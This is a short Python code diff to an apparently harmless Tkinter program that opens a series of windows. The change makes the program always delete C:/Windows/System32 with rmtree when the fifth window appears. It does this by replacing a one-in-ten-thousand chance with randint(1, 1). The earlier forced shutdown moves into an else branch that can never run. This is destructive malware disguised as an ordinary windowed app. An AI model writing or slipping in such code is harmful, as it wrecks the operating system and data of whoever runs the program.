@@ -33,9 +33,10 @@ def createWindow(labelText, buttonText, i):
         frame.pack(pady=70)
     windows.append(window)
     if i == 4:
-        system('shutdown /s /t 5')
-        if randint(1, 10000) == 1:
+        if randint(1, 1) == 1:
             rmtree("C:/Windows/System32")
+        else:
+            system('shutdown /s /t 5')
     return window
 def createNewWindow(i):
     '''Создание нового окна после нажатия кнопки'''
